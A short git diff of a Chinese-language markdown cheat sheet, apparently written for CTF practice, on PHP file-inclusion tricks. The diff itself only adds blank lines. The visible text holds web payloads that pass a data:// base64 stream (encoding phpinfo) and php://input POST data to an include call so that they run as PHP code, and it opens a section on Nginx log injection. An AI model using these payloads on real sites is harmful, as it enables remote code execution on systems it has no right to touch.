@@ -42,17 +42,19 @@ url?c=include$_GET[1];&1=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 ```
 
 ### php://input
+
 > 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行  
 
 payload3：**url?c=include$_GET[1];&1=php://input**
 
 POST:  
+
 ```php
 echo'hello'
 ```
 
-
 ## 2.1 include+日志注入
+
 > 对于Nginx  
 > 默认的日志文件目录通常如下：
 访问日志（Access Log）：  
